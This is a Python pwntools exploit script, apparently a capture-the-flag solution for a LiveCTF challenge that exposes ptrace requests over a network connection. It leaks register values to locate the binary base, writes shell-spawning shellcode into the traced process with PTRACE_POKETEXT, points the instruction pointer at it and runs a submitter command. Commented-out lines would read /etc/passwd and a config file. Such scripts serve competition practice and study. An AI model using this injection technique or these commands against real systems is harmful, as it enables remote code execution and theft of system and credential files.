#!/usr/bin/env python3

from pwn import *


def conn():
    if args.LOCAL:
        exe = ELF("./challenge_patched")
        libc = ELF("./libc.so.6")
        ld = ELF("./ld-linux-x86-64.so.2")

        context.binary = exe
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        context.arch='amd64'
        HOST = os.environ.get('HOST', 'localhost')
        r = remote(HOST, 31337)

    return r



PTRACE_PEEKDATA = 2
PTRACE_PEEKUSER = 3

PTRACE_POKETEXT = 4
PTRACE_POKEUSER = 6


PTRACE_CONT = 7


PTRACE_GETREGS = 12
PTRACE_SYSCALL = 24


start_search = 0x00555555554000


s = conn()

def do_ptrace(req, addr, data,stop=False):
    s.sendlineafter(b"What ptrace request do you want to send?", hex(req).encode())
    s.sendlineafter(b"What address do you want?", hex(addr).encode())
    s.sendlineafter(b"What do you want copied into data?\n", hex(data).encode())
    out = s.recvuntil(b"Do another (0/1)?", drop=True).splitlines()

    if stop==True:
        s.sendline(b'0')
    else:
        s.sendline(b'1')

    err = None

    ret = int(out[0].split()[-1], 16)
    if len(out) > 1:
        err = out[1]
    return ret, err

stack_search_start = 0x007ffcacc0c000
stack_search_step = 0x20000

reg_names = ['r15', 'r14', 'r13', 'r12', 'rbp', 'rbx', 'r11', 'r10', 'r9','r8','rax','rcx','rdx','rsi', 'rdi','orig_rax','rip', 'cs', 'eflags', 'rsp']

def dump_regs():
    regs = {}
    for r, i in zip(reg_names, range(len(reg_names))):
        ret, err = do_ptrace(PTRACE_PEEKUSER, i*8, 0)
        if err is None:
            regs[r] = ret
        else:
            print(err)
            assert False
    return regs


def sys_step(i):
    print(f'===={i}====')
    do_ptrace(PTRACE_SYSCALL, 0, 0)
    #regs = dump_regs()

    #for n,r in regs.items():
    #    print(f"{n}: 0x{r:08x}")

def dumpprintregs():
    return
    regs = dump_regs()

    for n,r in regs.items():
        print(f"{n}: 0x{r:08x}")

def main():





    binary_off = 0x03a7 # this is after getpid
    #addr = stack_search_start
    #with log.progress("Finding base") as p:
    #    while True:
    #        ret, err = do_ptrace(PTRACE_PEEKDATA, addr, 0)
    #        if ret != 0xffffffffffffff:
    #            break
    #        addr += stack_search_step
    #        p.status(f'Trying {addr:x}')
    #    print("Found base!")

    regs = dump_regs()
    for n,r in regs.items():
        print(f"{n}: 0x{r:08x}")

    r13 = regs['r13']
    bin_base = r13 - (r13 & 0xfff) 
    log.success(f"bin base at {bin_base:x}")

    sc = shellcraft.sh()
    #sc = shellcraft.write(1,bin_base+binary_off,20)
    #sc = shellcraft.cat2('/home/livectf/.config.toml',fd=1,length=0x100)
    #sc = shellcraft.write(1, "THISMUSTWORK",8)
    #raw_input()
    sc += shellcraft.exit(0)
    pl = b'\x90\x90\x90\x90\x90' + asm(sc)
    pl += b'\x90' * (8 - len(pl) % 8)
    print(len(pl))
    assert(len(pl) % 8 == 0)

    import struct
    for i in range(0, len(pl), 8):
        print(i)
        print(pl[i:i+8])
        ret, err = do_ptrace(PTRACE_POKETEXT, bin_base+binary_off+i, u64(pl[i:i+8]))
        print(ret)
        #ret, err = do_ptrace(PTRACE_PEEKDATA, bin_base+binary_off+i, u64(pl[i:i+8]))
        #print(hex(ret))

    do_ptrace(PTRACE_POKEUSER, 16*8, bin_base + binary_off)
    print("AAAAA")
    dumpprintregs()
    print("AAAAA")


    try:
        for i in range(20):
            sys_step(i)

        do_ptrace(PTRACE_CONT,0,0,stop=True)
        #s.sendline(b'cat /etc/passwd')
        #s.sendline(b'cat /home/livectf/.config.toml')
        s.sendline(b'/home/livectf/submitter')
        s.sendline(b'/home/livectf/submitter')
        #print(s.readline())
        print(s.readline())
        print(s.readline())
        print(s.readline())
    except:
        exit()
    #print(s.readline())
    #print(s.readline())
    #print(s.readline())
    #print(s.readline())
    #print(s.readline())
    #print(s.readline())
    #exit()


if __name__ == "__main__":
    main()